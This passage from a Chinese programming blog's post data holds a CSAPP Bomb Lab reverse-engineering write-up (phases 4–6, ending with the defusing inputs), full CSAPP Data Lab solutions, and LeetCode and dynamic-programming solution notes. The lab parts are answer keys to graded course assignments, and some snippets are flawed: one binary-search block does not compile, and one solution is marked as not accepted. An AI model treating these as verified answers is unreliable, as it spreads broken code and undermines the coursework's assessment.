&lt;+60&gt;: call 0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;: test %eax,%eax0x000000000040104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt;...0x0000000000401051 &lt;+69&gt;: cmpl $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt; 从这段汇编代码, 可以得出以下信息: 能够从输入中得到两个整数 第一个数 x, x &lt;= 14 func4 函数的返回值 %rax == 0 第二个数 y, y == 0 反汇编 func4函数从整体来看, func4函数调用了自己, 所以这是一个递归程序 12345670x0000000000400fe2 &lt;+20&gt;: cmp %edi,%ecx0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt;...0x0000000000400fe9 &lt;+27&gt;: call 0x400fce &lt;func4&gt;...0x0000000000400ffe &lt;+48&gt;: call 0x400fce &lt;func4&gt; 第一部分: 123456780x0000000000400fce &lt;+0&gt;: sub $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;: mov %edx,%eax0x0000000000400fd4 &lt;+6&gt;: sub %esi,%eax0x0000000000400fd6 &lt;+8&gt;: mov %eax,%ecx0x0000000000400fd8 &lt;+10&gt;: shr $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;: add %ecx,%eax0x0000000000400fdd &lt;+15&gt;: sar $1,%eax0x0000000000400fdf &lt;+17&gt;: lea (%rax,%rsi,1),%ecx 函数的参数分别保存在%rdi, %rsi, %rdx, %rcx 中,在这里使用a, b, c, d表示调用函数时, 假设参数分别为1, 0, 14, 0,执行上诉汇编代码: 1234567m = c = 14m = m - b = 14 - 0 = 14d = m = 14d = d &gt;&gt; 31 = 14 &gt;&gt; 31 = 0m = m + d = 14 + 0 = 14m = 14 &gt;&gt; 1 = 7d = 7 + b = 7 + 0 = 7 可以看出, 这段代码的功能是求区间[b, c]的中间值,保存在d中 第二部分: 知道了区间的中点后,将其和x进行比较, 会根据结果进入不同分支 120x0000000000400fe2 &lt;+20&gt;: cmp %edi,%ecx0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt; 假设不满足d &lt;= a这个条件 , 即中间值比x大, 跳转, 会执行下述汇编代码 120x0000000000400fe6 &lt;+24&gt;: lea -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;: call 0x400fce &lt;func4&gt; 此时发起的调用为func(1, 0, 6, 7), 从区间[0, 6]查找 假设满足这个条件, 跳转, 执行下述汇编代码 1234560x0000000000400ff2 &lt;+36&gt;: mov $0x0,%eax0x0000000000400ff7 &lt;+41&gt;: cmp %edi,%ecx0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;: lea 0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;: call 0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;: lea 0x1(%rax,%rax,1),%eax 这里也有两个分支 120x0000000000400ff7 &lt;+41&gt;: cmp %edi,%ecx0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt; 满足这个条件d &gt;= a, 结合上一个条件d &lt;= a,即d == a时,函数执行返回 如果不满足这个条件d &gt;= a, 此时发起的调用为func(1, 8, 14, 7)注意到, 这个分支会将使得%rax = 2 * %rax + 1, 结合函数执行返回时,要让%rax = 0, 也就是说,只要执行该分支的代码就必然不满足%rax == 0的条件 func4的python版本根据上面, 函数的整体逻辑为: 123456if d &lt;= a: if d &gt;= a: return 0 return 2 * fun(1, 8, 14, 7) + 1else: return 2 * func(1, 0, 6, 7) 这是一个二分搜索, 搜索区间为[b, c], 满足%rax == 0条件的x 不位于二分搜索树的右子树 以下是python版本 1234567891011121314151617181920212223242526def func(x, y, m, n): a = m - y n = a &gt;&gt; 31 a = a + n a = a &gt;&gt; 1 n = a + y # n middle of the [y, m] if n &lt;= x: if n &gt;= x: return 0 a = func(x, n + 1, m, n) return 2 * a + 1 else: a = func(x, y, n - 1, n) return a * 2# 测试结果for i in range(0, 15): if func(i, 0, 14, 0) == 0: print(i)# 0 1 3 7# [0, 14]# [0, 7], [8, 14]# [0, 3], [4, 7];# [0, 1]# [0, 0] 拆弹: 12345678910Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one?1 2 4 8 16 32That's number 2. Keep going!1 311Halfway there!3 0So you got that one. Try this one. 第五个炸弹先看汇编代码位置0x4010b3后的内容 根据函数strings_not_equal知道,比较的应该是两个字符串 将 rsp+16 (rsp+0x10)处的值和0x40245e位置的值进行比较, 相等则结束,否则炸弹爆炸 123456780x00000000004010b3 &lt;+81&gt;: mov $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;: lea 0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;: call 0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;: test %eax,%eax0x00000000004010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;: call 0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;: nopl 0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;: jmp 0x4010d9 &lt;phase_5+119&gt; 看一下0x40245e保存的字符串,也就是要得到的字符串是flyers 12(gdb) x/s 0x40245e0x40245e: &quot;flyers&quot; 回到代码的开头,可知输入的长度为 612340x000000000040107a &lt;+24&gt;: call 0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;: cmp $0x6,%eax0x0000000000401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;: call 0x40143a &lt;explode_bomb&gt; 代码的主体部分12340x000000000040108b &lt;+41&gt;: movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;: mov %cl,(%rsp)0x0000000000401092 &lt;+48&gt;: mov (%rsp),%rdx0x0000000000401096 &lt;+52&gt;: and $0xf,%edx 10x0000000000401067 &lt;+5&gt;: mov %rdi,%rbx 根据代码开头的汇编,知道rbx保存了输入的位置,结合这部分代码,会取出输入的最低 4 位放入edx中 然后下面接下来的指令: 123450x0000000000401099 &lt;+55&gt;: movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;: mov %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;: add $0x1,%rax0x00000000004010a8 &lt;+70&gt;: cmp $0x6,%rax0x00000000004010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt; 0x401099处指令表示取出0x4024b0+rdx的 1 字节并零扩展到 4 字节放入edx中然后将dl中的数据放入0x10(%rsp,%rax,1)位置处最后将rax的值加 1, 重复上诉过程 查看0x4024b0位置处的值 12(gdb) x/s 0x4024b00x4024b0 &lt;array.3449&gt;: &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot; 所以可以知道,代码的整体流程会从0x4024b0挑选出6个字符,放在以rsp+16开始的位置,不妨取偏移为9 15 14 5 6 7,即9 f e 5 6 7比较 ASCII码表,选择低字节满足要求的字符,不妨取9on567注意,答案不止一种 第六个炸弹保存输入位置0x401106处的指令call 0x40145c &lt;read_six_numbers&gt;根据前面的阶段可以知道会读入6个数,分别放入位置 rsp, rsp+4, rsp+8, rsp+12, rsp+16, rsp+20 检查输入从0x401117到0x401151处的指令会对输入做一些检查 每个数都小于等于 6,并且大于 0 每个数各不相同 检查一寄存器r13初始值为rsp的值,也就是第一个输入的值位置0x401114到0x401123处的指令会比较该值减去 1 和 5 的关系,如果大与 5,炸弹爆炸,否则正常进行 1234560x0000000000401114 &lt;+32&gt;: mov %r13,%rbp0x0000000000401117 &lt;+35&gt;: mov 0x0(%r13),%eax0x000000000040111b &lt;+39&gt;: sub $0x1,%eax0x000000000040111e &lt;+42&gt;: cmp $0x5,%eax0x0000000000401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;: call 0x40143a &lt;explode_bomb&gt; 位置0x40114d处的指令, 将r13的值加 4,也就是下一个输入的位置,然后重新跳转到0x401114 120x000000000040114d &lt;+89&gt;: add $0x4,%r130x0000000000401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt; 在每次检查,寄存器r12d会增加 1位置0x40112c处的指令: 120x000000000040112c &lt;+56&gt;: cmp $0x6,%r12d0x0000000000401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt; 知当寄存器r12d等于 6 时,结束循环,且r12d表示这是第几个输入 检查二检查一是外层循环, 内层循环会检查各个数之间的相等关系位置0x401132到位置0x40114b是内层循环的主体部分, 寄存器ebx是迭代变量,通过0x401138处的指令mov (%rsp,%rax,4),%eax, 将值放入eax中然后比较eax和rbp中的值如果不等,正常进行,否则炸弹爆炸 123456789 0x0000000000401132 &lt;+62&gt;: mov %r12d,%ebx0x0000000000401135 &lt;+65&gt;: movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;: mov (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;: cmp %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;: add $0x1,%ebx0x0000000000401148 &lt;+84&gt;: cmp $0x5,%ebx0x000000000040114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt; 从检查二和检查一可以知道,这六个输入为 1 到 6 的数,且各不相等 处理输入1234567890x0000000000401153 &lt;+95&gt;: lea 0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;: mov %r14,%rax0x000000000040115b &lt;+103&gt;: mov $0x7,%ecx0x0000000000401160 &lt;+108&gt;: mov %ecx,%edx0x0000000000401162 &lt;+110&gt;: sub (%rax),%edx0x0000000000401164 &lt;+112&gt;: mov %edx,(%rax)0x0000000000401166 &lt;+114&gt;: add $0x4,%rax0x000000000040116a &lt;+118&gt;: cmp %rsi,%rax0x000000000040116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt; 这部分代码的功能为 x = 7 - x,并将结果放回原处,x 为输入的数据 获取节点的位置指令跳转到0x401197处, 将值保存到寄存器ecx中,而且结合下面的指令: 1230x000000000040118d &lt;+153&gt;: add $0x4,%rsi0x0000000000401191 &lt;+157&gt;: cmp $0x18,%rsi0x0000000000401195 &lt;+161&gt;: je 0x4011ab &lt;phase_6+183&gt; 可以知道: 这是个循环, 只有当rsi等于0x18时才会推出循环 ecx保存的是输入值 该循环也有一个内层循环,位置从0x401176到0x40117f:会根据ecx的值进行循环,每次循环将rdx的值加 8,当eax = ecx时,将rdx的值保存到0x20(%rsp,%rsi,2)位置处 根据上面的代码, 可以知道会将节点位置分别保存在rsp+20, rsp+28, rsp+30, rsp+38, rsp+40, rsp+48(16 进制),这些节点和7-x存在一一对应的关系,如当7-x==1时,该位置则对应第一个节点, 最后在 0x401195处结束循环, 跳转到 位置4011ab 链接节点123456789101112130x00000000004011ab &lt;+183&gt;: mov 0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;: lea 0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;: lea 0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;: mov %rbx,%rcx0x00000000004011bd &lt;+201&gt;: mov (%rax),%rdx0x00000000004011c0 &lt;+204&gt;: mov %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;: add $0x8,%rax0x00000000004011c8 &lt;+212&gt;: cmp %rsi,%rax0x00000000004011cb &lt;+215&gt;: je 0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;: mov %rdx,%rcx0x00000000004011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt;0x00000000004011d2 &lt;+222&gt;: movq $0x0,0x8(%rdx) 0x4011c0处的指令会将节点链接起来,形成一个链表,链表的顺序为7 - x的顺序, 比较节点大小0x4011e3取出 4 字节的内容放入eax中比较rbx地址保存的值和eax比较,若后者大于前者则正常进行,否则炸弹爆炸,以此类推节点 1 &gt; 节点 2 &gt; 节点 3 &gt; 节点 4 &gt; 节点 5 &gt; 节点 6 123450x00000000004011df &lt;+235&gt;: mov 0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;: mov (%rax),%eax0x00000000004011e5 &lt;+241&gt;: cmp %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;: call 0x40143a &lt;explode_bomb&gt; 查看 0x6032d0开始的节点和其值 要满足递减的顺序,所以其排列为3, 4, 5, 6, 1, 2所以输入的数为7-x, 即4, 3, 2, 1, 6, 5","link":"/posts/f788923f.html"},{"title":"leetcode做题记录 (一)","text":"两数之和题目来源：1.两数之和 123456789var twoSum = function (nums, target) { for (let i = 0, len = nums.length; i &lt; len; i++) { for (let j = i + 1; j &lt; len; j++) { if (nums[i] + nums[j] === target) { return [i, j]; } } }}; 杨辉三角题目来源：118. 杨辉三角 注意到，如果将杨辉三角看作一个二维数组，其中第i行第j列的元素的值与前一行的元素有以下关系(除了每一行第一个元素和最后一个元素，其值固定为 1)： a[i][j] = a[i - 1][j - 1] + a[i - 1][j] 123456789101112131415161718192021222324var generate = function (numRows) { let re = [[1], [1, 1]]; if (numRows == 1) { return re.slice(0, 1); } else if (numRows == 2) { return re.slice(0, 2); } else { for (let i = 2; i &lt; numRows; i++) { let tmp = [1]; for (let j = 1; j &lt;= i - 1; j++) { tmp.push(re[i - 1][j - 1] + re[i - 1][j]); } // tmp.splice(0, 0, 1); // tmp.splice(tmp.length, 0, 1); tmp.push(1); re.push(tmp); } return re; }};// arr.slice([start], [end]) :// 返回数组区间[start, end)的元素的一个副本// arr.splice(start[, deleteCount, elem1, ..., elemN]) ：// 从索引start开始修改arr，删除deleteCount个元素，插入elem1,elem2,...最后返回被删除元素组成的数组 二分查找题目来源：704.二分查找 二分查找算法会将序列分成两部分，根据中间位置（mid指示）的值确定下一次查找的位置。划分区间的方式不同也会导致循环结束的条件不同： 区间划分 结束条件 备注 (left, right) left &gt;= right - 1 (left, right】 left &gt; riht 有特殊处理 【left, right) left &gt;= right 【left, right】 left &gt; right 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677class Solution {public: int search(vector&lt;int&gt;&amp; nums, int target) { // =============================================================== // 1. 左开右开 (left, right) int left = - 1; int right = nums.size(); while(left &lt; right - 1 ) { int mid = left + ((right - left) &gt;&gt; 1); if(nums[mid] &lt; target) { left = mid; }else if(nums[mid] &gt; target) { right = mid; }else{ return mid; } } // =============================================================== // =============================================================== // 2. 左开右闭 (left, right] int left = - 1; int right = nums.size() - 1; while(left &lt; right ) { int mid = left + ((right - left) &gt;&gt; 1); if(nums[right] == target) return right; if (mid == left ) return -1; if(nums[mid] &lt; target) { left = mid; }else if(nums[mid] &gt; target) { right = mid - 1; }else{ return mid; } } // =============================================================== // =============================================================== // 3.左闭右开 [left, right) int left = 0; int right = nums.size() - 1 ; while(left &lt;= right) { int mid = left + ((right - left) &gt;&gt; 1); records.push_back(mid); if(nums[mid] &lt; target) { left = mid + 1; }else if(nums[mid] &gt; target) { right = mid - 1; }else{ return mid; } } // =============================================================== // =============================================================== // 4. 左闭右闭 [left, right] int left = 0; int right = nums.size() - 1; while(left &lt;= right) { int mid = left + ((right - left) &gt;&gt; 1); if(nums[mid] &lt; target) { left = mid + 1; }else if(nums[mid] &gt; target) { right = mid - 1; }else{ return mid; } } // =============================================================== return -1; }}; 斐波拉契题目来源：509. 斐波那契数 12345678910111213141516171819202122232425262728class Solution {public: // =============================================================== // 解一：动态规划 // 状态转移方程：dp[i] = dp[i - 1] + dp[i - 2] int fib(int n) { if(n &lt;= 1) return n; int* dp = new int[n + 1]; dp[0] = 0; dp[1] = 1; for(int i = 2; i &lt;= n; i++) { dp[i] = dp[i - 1] + dp[i - 2]; } return dp[n]; } // =============================================================== // =============================================================== // 解二：递归 int fib(int n) { if (n &lt;= 1) return n; return fib(n - 1) + fib(n - 2); } // ===============================================================}; 爬楼梯题目来源：70. 爬楼梯 dp[i] 表示到达第i + 1台阶的方法数，根据题意，该台阶可以从它的下一级台阶i - 1和i - 2爬到该位置，到达该位置的方法数为两者之和，所以状态转移方程为 dp[i] = dp[i - 1] + dp[i - 2] 12345678910111213141516class Solution {public: int climbStairs(int n) { if (n == 1) return 1; else if (n == 2) return 2; vector&lt;int&gt; dp(n); dp[0] = 1; dp[1] = 2; for(int i = 2; i &lt; n; i++) { dp[i] = dp[i - 1] + dp[i - 2]; } return dp[n - 1]; }}; 使用最小花费爬楼梯题目来源：747.最小花费爬楼梯 题目要求爬到楼梯顶部，根据 cost数组的长度为n,即要求爬到n + 1的位置 12345678910111213141516171819202122class Solution {public: int minCostClimbingStairs(vector&lt;int&gt;&amp; cost) { int len = cost.size(); vector&lt;int&gt; dp(len + 1); dp[0] = 0; dp[1] = 0; // dp[3] = min(dp[2] + const[2] , dp[1] + cost[1]) = min(35, 15) = 15 // dp[2] = min(dp[1] + cost[1], dp[0] + cost[0]) = min(15, 20) = 10 for ( int i = 2; i &lt;= len; i++) { dp[i] = min(dp[i - 2] + cost[i - 2], dp[i - 1] + cost[i - 1]) ; } return dp[len]; } int min(int x, int y) { return x &gt; y ? y : x; }}; 整数拆分题目来源 ：343.整数拆分 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class Solution {public: // =============================================================== // 解一：数学，根据中学数学 a + b = m, 求ab的最大值，该值出现在a=b时， // 大胆猜测，该题的解出现在将n均分的情况， // 若不能均分则将余数尽量分给其余值，使得加法的拆分因子的方差尽可能的小 int integerBreak(int n) { int max = 0; for (int k = 2; k &lt;= n; k++) { int a = n / k; int b = n % k; int steps = b; int tmp = 1; while (steps--) { tmp *= (a + 1); } steps = k - b; while (steps--) { tmp *= a; } if (tmp &gt; max) { max = tmp; } } return max; } // =============================================================== // =============================================================== // 解二：动态规划 int integerBreak(int n) { vector&lt;int&gt; dp(n + 1); dp[2] = 1; for (int i = 3; i &lt;= n; i++) { for (int j = 1; j &lt; i; j++) { dp[i] = max(dp[i], max((i - j) * j, j * dp[i - j])); } } return dp[n]; } // ===============================================================}; 不同的二叉搜索树题目来源：96.不同的二叉搜索树 节点总数为 n 的数可以分为左右两个子树，该树的总形态数为左右两子树形态数的乘积例如： dp[2] = dp[0] * dp[1] + dp[1] * dp[0] = 1 * 1 + 1 * 1 = 2 dp[3] = dp[0] * dp[2] + dp[1] * dp[1] + dp[2] * dp[0] = 1 * 2 + 1 * 1 + 2 * 1 = 2 + 1 + 2 = 5 状态转移方程为 $$dp[i] = \\sum_{j = 0}^{i - 1} dp[j] \\times dp[i - 1 - j]$$ 1234567891011121314class Solution {public: int numTrees(int n) { vector&lt;int&gt; dp(n + 1); dp[0] = 1; dp[1] = 1; for (int i = 2; i &lt;= n; i++) { for(int j = 0; j &lt;= i - 1; j++) { dp[i] += dp[j] * dp[i - 1 - j]; } } return dp[n]; }}; 边积分最高的节点题目来源: 2374.边积分最高的节点 123456789101112131415class Solution {public: int edgeScore(vector&lt;int&gt;&amp; edges) { int count = edges.size(); vector&lt;long&gt; sum(count); int index = 0; for (int i = 0; i &lt; count; i++) { sum[edges[i]] += i; if (sum[index] &lt; sum[edges[i]] || sum[index] == sum[edges[i]] &amp;&amp; index &gt; edges[i]) index = edges[i]; } return index; }}; 找到小镇的法官题目来源: 997.找到小镇的法官 1234567891011121314151617181920class Solution {public: int findJudge(int n, vector&lt;vector&lt;int&gt;&gt;&amp; trust) { int len = trust.size(); vector&lt;int&gt; num1(n); // 信任该 i 人的人数 vector&lt;int&gt; num2(n); // i 人信任的人数 for (int i = 0; i &lt; len; i++) { num2[trust[i][0] - 1]++; num1[trust[i][1] - 1]++; } for (int i = 0; i &lt; n; i++) { if (num1[i] == n - 1 &amp;&amp; num2[i] == 0) { return i + 1; } } return -1; }}; 最佳观光组合题目来源：1014.最佳观光组合 1234567891011class Solution {public: int maxScoreSightseeingPair(vector&lt;int&gt;&amp; values) { int ans = 0, mx = values[0] + 0; for (int j = 1; j &lt; values.size(); ++j) { ans = max(ans, mx + values[j] - j); mx = max(mx, values[j] + j); } return ans; }};","link":"/posts/b74f5b0d.html"},{"title":"CSAPP Data Lab","text":"csapp DataLab bitXor12345678910/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) { return ~(~y &amp; ~x) &amp; ~(x &amp; y);} tmin123456789/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) { return 1 &lt;&lt; 31;} isTmax12345678910/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) { return !(~x ^ (x + 1)) &amp; !!(x + 1);} allOddBits123456789101112131415/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) { int mask = 0xAA; mask = mask &lt;&lt; 8 | mask; mask = mask &lt;&lt; 16 | mask; return !((x &amp; mask )^ mask);} negate12345678910111213/*- negate - return -x- Example: negate(1) = -1.- Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;- Max ops: 5- Rating: 2 _/*/ int negate(int x) { return ~x + 1; } isAsciiDigit123456789101112131415/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) { int y = x &gt;&gt; 4; int z = x &amp; 0xf; // 最低4位 return !(y ^ 0x3) &amp; !((0x9 + ((~z) + 1)) &gt;&gt; 31);} conditional1234567891011121314/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) { int isZero = !(x ^ 0); int mask = ~isZero + 1; return (~mask &amp; y) | (mask &amp; z);} isLessOrEqual12345678910111213141516171819/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) { int signx = x &gt;&gt; 31; int signy = y &gt;&gt; 31; int c1 = !(signx ^ signy); int signsub = (x + (~y + 1)) &gt;&gt; 31; // return !(x ^ y) | (!c1 &amp; signx) | (c1 &amp; signsub) | (c1 &amp; signsub); return (!(x ^ y)) | ((!c1) &amp; signx) | (c1 &amp; signsub);} logicalNeg123456789101112/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) { return ((x | (~x + 1)) &gt;&gt; 31) + 1;} howManyBits123456789101112131415161718192021222324252627282930/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { int b16, b8, b4, b2, b1, b0; int sign = x &gt;&gt; 31; x = (sign &amp; ~x) | (~sign &amp; x); b16 = !!(x &gt;&gt; 16) &lt;&lt; 4; x = x &gt;&gt; b16; b8 = !!(x &gt;&gt; 8) &lt;&lt; 3; x = x &gt;&gt; b8; b4 = !!(x &gt;&gt; 4) &lt;&lt; 2; x = x &gt;&gt; b4; b2 = !!(x &gt;&gt; 2) &lt;&lt; 1; x = x &gt;&gt; b2; b1 = !!(x &gt;&gt; 1); x = x &gt;&gt; b1; b0 = x; return b16 + b8 + b4 + b2 + b1 + b0 + 1;} floatScale212345678910111213141516171819202122/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) { unsigned s = uf &amp; (1 &lt;&lt; 31); unsigned exp = (uf &amp; 0x7f800000) &gt;&gt; 23; unsigned frac = (uf &amp; ~0xff800000); if (exp == 0) return s | frac &lt;&lt; 1; else if (exp == 255) return uf; return s | (exp + 1) &lt;&lt; 23| frac;} floatFloat2Int123456789101112131415161718192021222324252627282930/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) { unsigned s = uf &amp; (1 &lt;&lt; 31); unsigned exp = (uf &amp; 0x7f800000) &gt;&gt; 23; unsigned frac = (uf &amp; ~0xff800000); int sign = (s &gt;&gt; 31) == 1 ?-1 : 1; int E = exp - 127; unsigned M = frac | (1 &lt;&lt; 23); if (E &gt; 31 || exp == 255) { return 0x80000000u; } if (E &lt; 0) return 0; return sign * (E &gt; 23 ? M &lt;&lt; (E - 23) : M &gt;&gt; (23 - E));} floatPower2123456789101112131415161718192021222324252627/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) { if (x &lt; -149) { return 0; } else if (x &gt; 127) { return 0x7F800000; } else if (x &gt;= -126) { int exp = x + 127; return exp &lt;&lt; 23; } else { int frac = 1 &lt;&lt; (23 - (-126 - x)); return frac; }}","link":"/posts/61702333.html"},{"title":"入门DP","text":"题目来源: 入门DP-题单 入门 DP爬楼梯source: 70. 爬楼梯 123456789101112131415class Solution {public: int climbStairs(int n) { vector&lt;int&gt; dp(n + 1); dp[0] = 1; dp[1] = 1; for (int i = 2; i &lt; n + 1; i++) { dp[i] = dp[i - 1] + dp[i - 2]; } return dp[n]; }}; 使用最小花费爬楼梯source: 746. 使用最小花费爬楼梯 1234567891011121314class Solution {public: int minCostClimbingStairs(vector&lt;int&gt;&amp; cost) { int n = cost.size(); vector&lt;int&gt; dp(n + 1); dp[0] = 0; dp[1] = 0; for (int i = 2; i &lt; n + 1; i++) { dp[i] = min(dp[i - 1] + cost[i - 1], dp[i - 2] + cost[i - 2]); } return dp[n]; }}; 组合总和 Ⅳsource: 377. 组合总和 Ⅳ 123456789101112131415161718class Solution {public: int combinationSum4(vector&lt;int&gt;&amp; nums, int target) { int n = nums.size(); vector&lt;unsigned long long &gt; dp(target + 1); dp[0] = 1; for(int i = 1; i &lt;= target; i++) { for(int j = 0; j &lt; n; j++) { if(i &lt; nums[j]) continue; dp[i] += dp[i - nums[j]]; } } return dp[target]; }}; 打家劫舍source: 198. 打家劫舍 123456789101112131415161718class Solution {public: int rob(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; dp(n); if(n == 1) return nums[0]; dp[0] = nums[0]; dp[1] = max(nums[1], nums[0]); for(int i = 2; i &lt; n; i++) { dp[i] = max(dp[i - 1], dp[i - 2] + nums[i]); } return dp[n - 1]; }}; 统计构造好字符串的方案数source: 2466. 统计构造好字符串的方案数 12345678910111213141516171819202122class Solution { const static int magic = 1e9 + 7;public: int countGoodStrings(int low, int high, int zero, int one) { vector&lt;long long&gt; dp(high + 1); dp[0] = 1; for (int i = 1; i &lt;= high; i++) { if (i &gt;= zero) dp[i] += dp[i - zero] % magic; if (i &gt;= one) dp[i] += dp[i - one] % magic; } long long sum = 0; for (int i = low; i &lt;= high; i++) { sum += dp[i]; } return sum % magic; }}; 统计打字方案数source: 2266. 统计打字方案数 12345678910111213141516171819202122232425262728293031323334353637383940// my version not ACclass Solution { const static int magic = 1e9 + 7; vector&lt;long long &gt;memo; int dfs(int j, string pressedKeys) { int len = pressedKeys.size(); if(j == len) return 1; long long &amp; num = memo[j]; if(num != -1) { return num %magic; } int cnt = 0; char current = pressedKeys[j]; for(int i = j; i &lt; len; i++) { if(pressedKeys[i] != current) break; cnt++; } num = 0; for (int i = 1; i &lt;= cnt; i++) { num += dfs(j + i, pressedKeys) % magic; } return num; }public: int countTexts(string pressedKeys) { memo.resize(pressedKeys.size() + 1, -1); long long res = dfs(0, pressedKeys) % magic; return res; }}; 删除并获得点数source:740. 删除并获得点数 123456789101112131415161718192021222324class Solution {const static int LEN = 1e4;private: int rob(vector&lt;int&gt; f){ vector&lt;int&gt; g(LEN + 2); g[0] = 